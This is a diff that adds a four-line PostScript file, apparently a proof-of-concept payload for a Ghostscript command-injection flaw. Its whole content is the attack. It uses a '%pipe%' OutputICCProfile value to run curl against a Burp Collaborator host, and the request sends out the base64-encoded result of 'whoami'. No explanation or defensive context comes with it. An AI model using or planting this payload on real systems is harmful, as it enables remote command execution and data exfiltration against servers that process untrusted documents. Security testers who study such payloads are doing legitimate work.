@@ -1,0 +1,4 @@
+%!PS
+currentdevice null true mark /OutputICCProfile (%pipe%curl http://e9o5vrbassfz8bk7afgdbari0962ur.burpcollaborator.net/?a=$(whoami|base64) )
+.putdeviceparams
+quit
